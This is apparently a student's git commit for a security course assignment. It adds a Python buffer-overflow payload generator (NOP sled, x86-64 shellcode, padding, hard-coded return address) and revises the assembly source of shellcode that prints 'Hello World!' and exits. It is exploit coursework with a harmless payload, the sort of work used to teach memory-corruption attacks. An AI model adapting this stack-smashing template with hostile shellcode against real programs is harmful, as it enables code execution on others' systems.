7cd28a2aee60a96f9ad29ac626b9ad33940f289d
Kvats <kaustav16048@iiitd.ac.in>
2019-03-10 00:45:14 +0530

    Ass2 Q1 GDB Done

---
+++ Assignment-2/CustomPayloadGenerator.py
@@ -0,0 +1,25 @@
+#!/usr/bin/python
+# Payload generator
+
+## Total payload length
+payload_length = 72
+## Amount of nops
+nop_length = 10
+## Controlled memory address to return to in Little Endian format
+return_address = '\x10\xdd\xff\xff\xff\x7f\x00\x00'
+
+## Building the nop slide
+nop_slide = "\x90" * nop_length
+
+## Malicious code injection
+buf =  ""
+buf += "\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x89\xfa\x48\x83\xc2\x0e\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21"
+
+## Building the padding between buffer overflow start and return address
+padding = '\x00' * (payload_length - nop_length - len(buf))
+# print "Payload:", payload_length
+# print "nop_len:", nop_length
+# print "len_buf:", len(buf)
+# print "Padd_len:", len(padding)
+
+print nop_slide + buf +  padding + return_address
--- Assignment-2/shellcode.s
+++ Assignment-2/shellcode.s
@@ -1,45 +1,49 @@
-# Kaustav Vats (2016048)
-# nasm -f elf64 -o shellcode.o shellcode.s
-# ld -o shellcode shellcode.o
-# ./shellcode
-# Extract Shellcode
-# for i in `objdump -d hello | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\\x$i" ; done
+; # Kaustav Vats (2016048)
+; # nasm -f elf64 -o shellcode.o shellcode.s
+; # ld -o shellcode shellcode.o
+; # ./shellcode
+; # Extract Shellcode
+; # for i in `objdump -d shellcode | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\\x$i" ; done
 
 global _start
-
 section .text   
-
 _start:
     jmp mssg
-
 init:
-    push 1
-    pop rdi
+    pop rsi
+    xor rax, rax
+    mov al, 1
+    mov rdi, rax
+    mov rdx, rdi
+    add rdx, 0xE
+    ; push 1
+    ; pop rdi
     ; mov rdi, 1
-    push 1
-    pop rax
+    ; push 1
+    ; pop rax
     ; mov rax, 1
     ; push mssg
-    pop rsi
     ; mov rsi, mssg
-    push 0xE
-    pop rdx
+    ; push 0xE
+    ; pop rdx
     ; mov rdx, 0xE
     syscall
-    
-    push 60
-    pop rax
+    xor rax, rax
+    add rax, 60
     ; mov rax, 60
-    push 0
-    pop rdi
+    ; push 0
+    ; pop rdi
+    xor rdi, rdi
     ; mov rdi, 0
     syscall
-
 mssg:
     call init
+    db "Hello World!"
 
-    db "Hello World!", 10
-
-section .rodata
+; section .rodata
     ; mssg: db "Hello World!", 10
     ; mssglen: equ $ - mssg
+; 49 Length
+; \xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x89\xfa\x48\x83\xc2\x0e\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a
+; 0x7fffffffdd58
+; \x7f\xff\xff\xff\xdd\x10
